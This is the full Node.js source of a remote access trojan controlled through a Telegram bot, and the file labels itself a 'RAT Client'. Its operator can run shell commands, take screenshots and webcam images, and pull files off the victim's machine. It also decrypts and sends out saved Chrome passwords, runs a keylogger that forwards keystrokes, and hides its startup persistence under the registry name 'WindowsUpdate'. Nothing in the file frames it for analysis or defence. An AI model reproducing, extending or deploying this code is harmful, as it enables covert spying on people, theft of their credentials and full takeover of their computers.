const TelegramBot = require('node-telegram-bot-api');
const os = require('os');
const child_process = require('child_process');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const screenshot = require('screenshot-desktop');
const sqlite3 = require('sqlite3');
const { unprotectData } = require('win-dpapi');

// --- PLACEHOLDERS ---
const BOT_TOKEN = '%%BOT_TOKEN%%';
const CHAT_ID = '%%CHAT_ID%%';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- HELPER FUNCTIONS ---
function executeCommand(command) {
    return new Promise((resolve, reject) => {
        child_process.exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(`Error: ${error.message}`);
                return;
            }
            if (stderr) {
                resolve(`Stderr: ${stderr}`);
                return;
            }
            resolve(stdout);
        });
    });
}

// --- COMMANDS ---

bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, '✅ RAT Client Connected.\n\n/commands - List all commands.');
});

bot.onText(/\/commands/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const commands = `
/info - Get system information
/screen - Take a screenshot
/pwd - Get current working directory
/ls - List files in current directory
/cd <directory> - Change directory
/download <file_path> - Download a file
/cmd <command> - Execute a shell command
/shutdown - Shutdown the PC
/reboot - Reboot the PC
/kill_process <process_name> - Kill a process
/open_url <url> - Open a URL in the browser
/passwords_chrome - (WIP) Steal Chrome passwords
    `;
    bot.sendMessage(CHAT_ID, commands);
});

bot.onText(/\/info/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const username = os.userInfo().username;
    const hostname = os.hostname();
    const platform = os.platform();
    const release = os.release();
    const arch = os.arch();
    const cpus = os.cpus()[0].model;
    const totalmem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB';
    const freemem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + ' GB';

    axios.get('http://ip-api.com/json').then(response => {
        const ip_info = response.data;
        const info = `
💻 *System Information* 💻
-------------------------
Username: ${username}
Hostname: ${hostname}
Platform: ${platform}
Release: ${release}
Architecture: ${arch}
CPU: ${cpus}
Total Memory: ${totalmem}
Free Memory: ${freemem}

🌐 *Network Information* 🌐
-------------------------
IP: ${ip_info.query}
Country: ${ip_info.country}
City: ${ip_info.city}
ISP: ${ip_info.isp}
        `;
        bot.sendMessage(CHAT_ID, info, { parse_mode: 'Markdown' });
    }).catch(error => {
        bot.sendMessage(CHAT_ID, 'Failed to get IP information.');
    });
});

bot.onText(/\/pwd/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, `Current directory: \`${process.cwd()}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/ls/, async (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    try {
        const files = fs.readdirSync(process.cwd());
        let fileList = 'Files and Directories:\n\n';
        files.forEach(file => {
            fileList += `- ${file}\n`;
        });
        // Split message if too long
        if (fileList.length > 4096) {
            const parts = fileList.match(/[\s\S]{1,4000}/g) || [];
            for (const part of parts) {
                await bot.sendMessage(CHAT_ID, '`' + part + '`', { parse_mode: 'Markdown' });
            }
        } else {
            bot.sendMessage(CHAT_ID, '`' + fileList + '`', { parse_mode: 'Markdown' });
        }
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Error listing files: ${error.message}`);
    }
});

bot.onText(/\/cd (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const newDir = match[1];
    try {
        process.chdir(newDir);
        bot.sendMessage(CHAT_ID, `Changed directory to: \`${process.cwd()}\``, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Error changing directory: ${error.message}`);
    }
});

bot.onText(/\/screen/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, 'Taking screenshot...');
    screenshot({ format: 'png' }).then((img) => {
        bot.sendPhoto(CHAT_ID, img, { caption: 'Screenshot' });
    }).catch((err) => {
        bot.sendMessage(CHAT_ID, `Failed to take screenshot: ${err}`);
    });
});

bot.onText(/\/download (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const filePath = match[1];
    if (fs.existsSync(filePath)) {
        bot.sendMessage(CHAT_ID, `Uploading ${filePath}...`);
        bot.sendDocument(CHAT_ID, filePath).catch(err => {
            bot.sendMessage(CHAT_ID, `Failed to upload file: ${err.message}`);
        });
    } else {
        bot.sendMessage(CHAT_ID, 'File not found.');
    }
});

bot.onText(/\/cmd (.+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const command = match[1];
    bot.sendMessage(CHAT_ID, `Executing: \`${command}\``, { parse_mode: 'Markdown' });
    try {
        const output = await executeCommand(command);
        if (output.length > 4096) {
             const parts = output.match(/[\s\S]{1,4000}/g) || [];
            for (const part of parts) {
                await bot.sendMessage(CHAT_ID, '`' + part + '`', { parse_mode: 'Markdown' });
            }
        } else {
            bot.sendMessage(CHAT_ID, '`' + output + '`', { parse_mode: 'Markdown' });
        }
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Error executing command: \n\`${error}\``, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/shutdown/, async (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, 'Shutting down...');
    try {
        await executeCommand('shutdown /s /f /t 0');
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Failed to shutdown: ${error}`);
    }
});

bot.onText(/\/reboot/, async (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, 'Rebooting...');
    try {
        await executeCommand('shutdown /r /f /t 0');
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Failed to reboot: ${error}`);
    }
});

bot.onText(/\/kill_process (.+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const processName = match[1];
    bot.sendMessage(CHAT_ID, `Killing process: ${processName}`);
    try {
        const output = await executeCommand(`taskkill /F /IM ${processName}`);
        bot.sendMessage(CHAT_ID, `\`${output}\``, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Failed to kill process: ${error}`);
    }
});

bot.onText(/\/open_url (.+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    const url = match[1];
    bot.sendMessage(CHAT_ID, `Opening URL: ${url}`);
    try {
        await executeCommand(`start ${url}`);
        bot.sendMessage(CHAT_ID, 'URL opened.');
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Failed to open URL: ${error}`);
    }
});

// --- WIP Features ---

async function getChromePasswords() {
    let resultText = '🔑 Chrome Passwords 🔑\n\n';
    try {
        const localAppData = process.env.LOCALAPPDATA;
        const chromeDataPath = path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');

        if (!fs.existsSync(chromeDataPath)) {
            return 'Chrome Login Data not found.';
        }

        const tempDbPath = path.join(os.tmpdir(), 'chrome_logins.db');
        fs.copyFileSync(chromeDataPath, tempDbPath);

        const db = new sqlite3.Database(tempDbPath, sqlite3.OPEN_READONLY, (err) => {
            if (err) {
                resultText += `Error connecting to DB: ${err.message}\n`;
            }
        });

        return new Promise((resolve, reject) => {
            db.all('SELECT action_url, username_value, password_value FROM logins', [], (err, rows) => {
                if (err) {
                    resolve(`Error querying DB: ${err.message}`);
                    return;
                }

                if (rows.length === 0) {
                    resolve('No saved logins found.');
                    return;
                }

                let processedCount = 0;
                rows.forEach((row) => {
                    if (row.password_value) {
                        try {
                            const decryptedPassword = unprotectData(row.password_value, null, 'local').toString('utf-8');
                            resultText += `URL: ${row.action_url}\nUser: ${row.username_value}\nPass: ${decryptedPassword}\n\n`;
                        } catch (e) {
                            // Ignore passwords that can't be decrypted
                        }
                    }
                    processedCount++;
                    if (processedCount === rows.length) {
                        db.close();
                        fs.unlinkSync(tempDbPath); // Clean up temp file
                        resolve(resultText);
                    }
                });
            });
        });
    } catch (e) {
        return `An error occurred: ${e.message}`;
    }
}


bot.onText(/\/passwords_chrome/, async (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, 'Extracting Chrome passwords... This may take a moment.');
    try {
        const passwords = await getChromePasswords();
        if (passwords.length > 4096) {
            const parts = passwords.match(/[\s\S]{1,4000}/g) || [];
            for (const part of parts) {
                await bot.sendMessage(CHAT_ID, part);
            }
        } else {
            bot.sendMessage(CHAT_ID, passwords);
        }
    } catch (error) {
        bot.sendMessage(CHAT_ID, `Error getting passwords: ${error.message}`);
    }
});

// -- START_FEATURE_WEBCAM --
const NodeWebcam = require( "node-webcam" );
bot.onText(/\/webcam/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    bot.sendMessage(CHAT_ID, 'Capturing webcam image...');
    const webcam = NodeWebcam.create({ width: 1280, height: 720, quality: 100, saveShots: false });
    webcam.capture("temp_webcam_shot", function( err, data ) {
        if (err) {
            return bot.sendMessage(CHAT_ID, `Failed to capture webcam: ${err}`);
        }
        const imageBuffer = Buffer.from(data.split(",")[1], 'base64');
        bot.sendPhoto(CHAT_ID, imageBuffer, { caption: 'Webcam Snapshot' });
    });
});
// -- END_FEATURE_WEBCAM --

// -- START_FEATURE_KEYLOGGER --
const Keylogger = require('node-keylogger');
const keylogger = new Keylogger();
let keylog = '';
keylogger.on('keypress', (key) => {
    keylog += key;
    // Send log every 100 characters, or you can set a timer
    if (keylog.length > 100) {
        bot.sendMessage(CHAT_ID, `Keylog:\n${keylog}`);
        keylog = '';
    }
});
bot.onText(/\/keylog_dump/, (msg) => {
    if (msg.chat.id.toString() !== CHAT_ID) return;
    if (keylog) {
        bot.sendMessage(CHAT_ID, `Keylog:\n${keylog}`);
        keylog = '';
    } else {
        bot.sendMessage(CHAT_ID, 'Keylog buffer is empty.');
    }
});
// -- END_FEATURE_KEYLOGGER --

// -- START_FEATURE_PERSISTENCE --
function addToStartup() {
    const exePath = process.execPath;
    const command = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "${exePath}" /f`;
    return executeCommand(command);
}
addToStartup().catch(err => console.error('Failed to add to startup:', err));
// -- END_FEATURE_PERSISTENCE --

// Initial connection message
bot.sendMessage(CHAT_ID, 'RAT client started and listening for commands.').catch(err => {
    console.log("Could not send initial message. Check BOT_TOKEN and CHAT_ID.", err.code, err.response.body);
    // process.exit(1);
});

console.log("RAT Client is running...");
